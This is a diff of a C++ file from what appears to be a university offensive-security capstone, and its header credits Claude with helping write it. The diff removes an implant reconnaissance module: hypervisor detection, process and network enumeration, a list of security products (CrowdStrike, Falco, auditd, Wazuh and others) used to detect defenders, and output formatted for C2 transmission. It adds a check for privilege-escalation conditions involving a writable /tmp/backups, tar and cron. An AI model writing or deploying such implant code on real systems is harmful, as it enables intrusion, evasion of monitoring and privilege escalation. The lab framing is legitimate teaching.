@@ -1,19 +1,26 @@
-#include "recon.h"
+/*
+ * COMPSCI564 - Cyber Effects Capstone Project
+ * Privilege Escalation Pre-Check Implementation
+ * 
+ * AI Assistance Attribution:
+ * This code was developed with assistance from Claude (Anthropic) for:
+ * - getdents64 syscall for process enumeration
+ * - File access checks via direct syscalls
+ * - Minimal dependency string operations
+ * 
+ * For educational use in controlled lab environment only.
+ */
+
+#include "privesc_check.h"
 #include <unistd.h>
 #include <sys/syscall.h>
-#include <sys/utsname.h>
-#include <sys/ioctl.h>
 #include <sys/stat.h>
-#include <net/if.h>
-#include <linux/dirent.h>
-#include <arpa/inet.h>
 #include <fcntl.h>
+#include <linux/dirent.h>
 #include <cstring>
-#include <sstream>
-#include <vector>
 
 // ============================================================================
-// MINIMAL DEPENDENCY HELPERS
+// MINIMAL STRING HELPERS (no libc dependencies)
 // ============================================================================
 
 static int str_copy(char* dst, const char* src, int max_len) {
@@ -26,13 +33,6 @@ static int str_copy(char* dst, const char* src, int max_len) {
     return i;
 }
 
-static int hex_to_str(unsigned char value, char* buf) {
-    const char hex[] = "0123456789abcdef";
-    buf[0] = hex[(value >> 4) & 0xF];
-    buf[1] = hex[value & 0xF];
-    return 2;
-}
-
 static bool is_numeric(const char* str) {
     if (!str || !str[0]) return false;
     for (int i = 0; str[i]; i++) {
@@ -42,53 +42,71 @@ static bool is_numeric(const char* str) {
 }
 
 // ============================================================================
-// HYPERVISOR DETECTION via CPUID
+// DIRECTORY CHECKS
 // ============================================================================
 
-struct HypervisorInfo {
-    bool present;
-    char signature[13];
-};
-
-static HypervisorInfo detect_hypervisor_cpuid() {
-    HypervisorInfo info = {false, {0}};
+// Check if directory exists and is writable
+static bool check_directory_writable(const char* path) {
+    struct stat st;
     
-    #if defined(__x86_64__) || defined(__i386__)
-    unsigned int eax, ebx, ecx, edx;
-    
-    // CPUID with EAX=1: Check hypervisor present bit
-    eax = 1;
-    __asm__ __volatile__(
-        "cpuid"
-        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
-        : "a"(eax)
-    );
-    
-    // Bit 31 of ECX indicates hypervisor presence
-    if (ecx & (1u << 31)) {
-        info.present = true;
-        
-        // CPUID with EAX=0x40000000: Get hypervisor vendor string
-        eax = 0x40000000;
-        __asm__ __volatile__(
-            "cpuid"
-            : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
-            : "a"(eax)
-        );
-        
-        // Vendor signature is in EBX, ECX, EDX (12 bytes)
-        *((unsigned int*)&info.signature[0]) = ebx;
-        *((unsigned int*)&info.signature[4]) = ecx;
-        *((unsigned int*)&info.signature[8]) = edx;
-        info.signature[12] = '\0';
+    // Use direct syscall to check if directory exists
+    if (syscall(SYS_stat, path, &st) != 0) {
+        return false;
     }
-    #endif
     
-    return info;
+    // Check if it's a directory
+    if (!S_ISDIR(st.st_mode)) {
+        return false;
+    }
+    
+    // Try to create a test file to verify write access
+    char test_path[128];
+    str_copy(test_path, path, 100);
+    int len = 0;
+    while (test_path[len]) len++;
+    test_path[len++] = '/';
+    test_path[len++] = '.';
+    test_path[len++] = 't';
+    test_path[len++] = 's';
+    test_path[len++] = 't';
+    test_path[len] = '\0';
+    
+    int fd = syscall(SYS_open, test_path, O_WRONLY | O_CREAT | O_EXCL, 0600);
+    if (fd >= 0) {
+        syscall(SYS_close, fd);
+        syscall(SYS_unlink, test_path);
+        return true;
+    }
+    
+    return false;
 }
 
 // ============================================================================
-// PROCESS ENUMERATION via getdents64
+// TAR BINARY CHECK
+// ============================================================================
+
+// Check if tar binary is available
+static bool check_tar_available() {
+    struct stat st;
+    
+    // Check common tar locations
+    const char* tar_paths[] = {
+        "/bin/tar",
+        "/usr/bin/tar",
+        nullptr
+    };
+    
+    for (int i = 0; tar_paths[i] != nullptr; i++) {
+        if (syscall(SYS_stat, tar_paths[i], &st) == 0) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+// ============================================================================
+// CRON DAEMON CHECK
 // ============================================================================
 
 struct linux_dirent64 {
@@ -99,35 +117,26 @@ struct linux_dirent64 {
     char           d_name[];
 };
 
-struct ProcessEntry {
-    int pid;
-    char comm[64];
-    unsigned int uid;
-};
-
-static std::vector<ProcessEntry> enumerate_processes_full() {
-    std::vector<ProcessEntry> processes;
+// Check if cron daemon is running
+static bool check_cron_running() {
+    // Parse /proc looking for cron process
     char buf[4096];
     
     int proc_fd = syscall(SYS_open, "/proc", O_RDONLY | O_DIRECTORY);
-    if (proc_fd < 0) return processes;
+    if (proc_fd < 0) return false;
     
-    while (processes.size() < 512) {
+    bool found_cron = false;
+    
+    while (true) {
         long nread = syscall(SYS_getdents64, proc_fd, buf, sizeof(buf));
         if (nread <= 0) break;
         
         for (long pos = 0; pos < nread;) {
             struct linux_dirent64* d = (struct linux_dirent64*)(buf + pos);
             
+            // Check if directory name is numeric (PID)
             if (d->d_type == DT_DIR && is_numeric(d->d_name)) {
-                ProcessEntry entry = {0};
-                
-                // Convert PID
-                for (int i = 0; d->d_name[i]; i++) {
-                    entry.pid = entry.pid * 10 + (d->d_name[i] - '0');
-                }
-                
-                // Build /proc/[pid]/comm path
+                // Build path to /proc/[pid]/comm
                 char comm_path[64] = "/proc/";
                 int path_len = 6;
                 for (int i = 0; d->d_name[i]; i++) 
@@ -137,192 +146,88 @@ static std::vector<ProcessEntry> enumerate_processes_full() {
                 // Read process name
                 int comm_fd = syscall(SYS_open, comm_path, O_RDONLY);
                 if (comm_fd >= 0) {
-                    char comm_buf[64];
+                    char comm_buf[32];
                     long bytes = syscall(SYS_read, comm_fd, comm_buf, sizeof(comm_buf) - 1);
                     if (bytes > 0) {
                         comm_buf[bytes] = '\0';
-                        // Remove newline
-                        for (int i = 0; i < bytes; i++) {
-                            if (comm_buf[i] == '\n') comm_buf[i] = '\0';
+                        
+                        // Check for cron/crond
+                        if ((comm_buf[0] == 'c' && comm_buf[1] == 'r' && 
+                             comm_buf[2] == 'o' && comm_buf[3] == 'n') ||
+                            (comm_buf[0] == 'c' && comm_buf[1] == 'r' && 
+                             comm_buf[2] == 'o' && comm_buf[3] == 'n' && 
+                             comm_buf[4] == 'd')) {
+                            found_cron = true;
                         }
-                        str_copy(entry.comm, comm_buf, 64);
-                        
-                        // Read UID from /proc/[pid]/status
-                        char status_path[64];
-                        str_copy(status_path, "/proc/", 64);
-                        path_len = 6;
-                        for (int i = 0; d->d_name[i]; i++) 
-                            status_path[path_len++] = d->d_name[i];
-                        str_copy(status_path + path_len, "/status", 64 - path_len);
-                        
-                        int status_fd = syscall(SYS_open, status_path, O_RDONLY);
-                        if (status_fd >= 0) {
-                            char status_buf[1024];
-                            bytes = syscall(SYS_read, status_fd, status_buf, sizeof(status_buf) - 1);
-                            if (bytes > 0) {
-                                status_buf[bytes] = '\0';
-                                // Parse "Uid:\t1000\t..."
-                                char* uid_line = strstr(status_buf, "Uid:");
-                                if (uid_line) {
-                                    uid_line += 4;
-                                    while (*uid_line == '\t' || *uid_line == ' ') uid_line++;
-                                    entry.uid = atoi(uid_line);
-                                }
-                            }
-                            syscall(SYS_close, status_fd);
-                        }
-                        
-                        processes.push_back(entry);
                     }
                     syscall(SYS_close, comm_fd);
                 }
+                
+                if (found_cron) break;
             }
             
             pos += d->d_reclen;
         }
+        
+        if (found_cron) break;
     }
     
     syscall(SYS_close, proc_fd);
-    return processes;
+    return found_cron;
 }
 
 // ============================================================================
-// NETWORK INTERFACE ENUMERATION via ioctl
+// USERNAME RETRIEVAL
 // ============================================================================
 
-struct NetworkInterface {
-    char name[16];
-    char mac[18];
-    char ip[46];
-};
-
-static std::vector<NetworkInterface> enumerate_network_interfaces() {
-    std::vector<NetworkInterface> interfaces;
-    
-    const char* if_names[] = {"lo", "eth0", "eth1", "wlan0", "ens33", "enp0s3", nullptr};
-    
-    int sock = syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) return interfaces;
-    
-    for (int i = 0; if_names[i]; i++) {
-        struct ifreq ifr;
-        memset(&ifr, 0, sizeof(ifr));
-        str_copy(ifr.ifr_name, if_names[i], IFNAMSIZ);
-        
-        // Check if interface exists
-        if (syscall(SYS_ioctl, sock, SIOCGIFFLAGS, &ifr) < 0) {
-            continue;
-        }
-        
-        NetworkInterface iface = {0};
-        str_copy(iface.name, if_names[i], 16);
-        
-        // Get MAC address
-        if (syscall(SYS_ioctl, sock, SIOCGIFHWADDR, &ifr) == 0) {
-            unsigned char* m = (unsigned char*)ifr.ifr_hwaddr.sa_data;
-            int pos = 0;
-            for (int j = 0; j < 6; j++) {
-                pos += hex_to_str(m[j], iface.mac + pos);
-                if (j < 5) iface.mac[pos++] = ':';
-            }
-            iface.mac[pos] = '\0';
-        }
-        
-        // Get IP address
-        if (syscall(SYS_ioctl, sock, SIOCGIFADDR, &ifr) == 0) {
-            struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
-            inet_ntop(AF_INET, &addr->sin_addr, iface.ip, 46);
-        }
-        
-        interfaces.push_back(iface);
+// Get current username
+static void get_username(char* buf, int max_len) {
+    // Try to read from /proc/self/loginuid
+    int fd = syscall(SYS_open, "/proc/self/loginuid", O_RDONLY);
+    if (fd < 0) {
+        str_copy(buf, "unknown", max_len);
+        return;
     }
     
-    syscall(SYS_close, sock);
-    return interfaces;
+    char uid_buf[16];
+    long bytes = syscall(SYS_read, fd, uid_buf, sizeof(uid_buf) - 1);
+    syscall(SYS_close, fd);
+    
+    if (bytes > 0) {
+        uid_buf[bytes] = '\0';
+        // Remove newline
+        for (int i = 0; i < bytes; i++) {
+            if (uid_buf[i] == '\n') uid_buf[i] = '\0';
+        }
+        str_copy(buf, uid_buf, max_len);
+    } else {
+        str_copy(buf, "unknown", max_len);
+    }
 }
 
 // ============================================================================
-// SECURITY PRODUCT DETECTION
+// MAIN CHECK FUNCTION
 // ============================================================================
 
-static std::string detect_security_products(const std::vector<ProcessEntry>& processes) {
-    const char* security_procs[] = {
-        "ossec", "falco", "auditd", "crowdstrike", "falcon-sensor",
-        "cb-agent", "sentinelagent", "wazuh", "osquery", nullptr
-    };
+PrivEscConditions check_privesc_viability() {
+    PrivEscConditions conditions;
+    memset(&conditions, 0, sizeof(conditions));
     
-    std::ostringstream detected;
-    bool first = true;
+    // Get current UID
+    conditions.current_uid = syscall(SYS_getuid);
     
-    for (const auto& proc : processes) {
-        for (int i = 0; security_procs[i]; i++) {
-            if (strstr(proc.comm, security_procs[i])) {
-                if (!first) detected << ",";
-                detected << security_procs[i];
-                first = false;
-                break;
-            }
-        }
-    }
+    // Get username
+    get_username(conditions.username, sizeof(conditions.username));
     
-    return detected.str();
-}
-
-// ============================================================================
-// MAIN RECONNAISSANCE FUNCTION
-// ============================================================================
-
-std::string perform_full_recon() {
-    std::ostringstream output;
+    // Check /tmp/backups directory
+    conditions.backups_dir_exists = (syscall(SYS_access, "/tmp/backups", F_OK) == 0);
+    conditions.backups_dir_writable = check_directory_writable("/tmp/backups");
     
-    // System information
-    struct utsname uts;
-    char hostname[64] = "unknown";
-    char kernel[128] = "unknown";
+    // Check tar availability
+    conditions.tar_available = check_tar_available();
     
-    if (syscall(SYS_uname, &uts) == 0) {
-        snprintf(kernel, sizeof(kernel), "%s %s", uts.sysname, uts.release);
-        str_copy(hostname, uts.nodename, 64);
-    }
+    // Check if cron is running
+    conditions.cron_running = check_cron_running();
     
-    // UID/GID
-    unsigned int uid = syscall(SYS_getuid);
-    unsigned int gid = syscall(SYS_getgid);
-    bool is_root = (uid == 0);
-    
-    // Hypervisor detection
-    HypervisorInfo hv = detect_hypervisor_cpuid();
-    
-    // Enumerate processes
-    std::vector<ProcessEntry> processes = enumerate_processes_full();
-    
-    // Enumerate network interfaces
-    std::vector<NetworkInterface> interfaces = enumerate_network_interfaces();
-    
-    // Detect security products
-    std::string sec_products = detect_security_products(processes);
-    
-    // Format output (simplified text format for C2 transmission)
-    output << "=== SYSTEM RECONNAISSANCE ===\n";
-    output << "Hostname: " << hostname << "\n";
-    output << "Kernel: " << kernel << "\n";
-    output << "UID: " << uid << " | GID: " << gid << " | Root: " << (is_root ? "YES" : "NO") << "\n";
-    output << "Virtualization: " << (hv.present ? hv.signature : "PHYSICAL") << "\n";
-    output << "Security Products: " << (sec_products.empty() ? "None detected" : sec_products) << "\n";
-    
-    output << "\n--- NETWORK INTERFACES ---\n";
-    for (const auto& iface : interfaces) {
-        output << iface.name << " | MAC: " << iface.mac << " | IP: " << iface.ip << "\n";
-    }
-    
-    output << "\n--- PROCESSES (Top 20) ---\n";
-    int count = 0;
-    for (const auto& proc : processes) {
-        if (count++ >= 20) break;
-        output << "PID: " << proc.pid << " | UID: " << proc.uid << " | " << proc.comm << "\n";
-    }
-    
-    output << "\n=== END RECON ===\n";
-    
-    return output.str();
+    return conditions;
 }
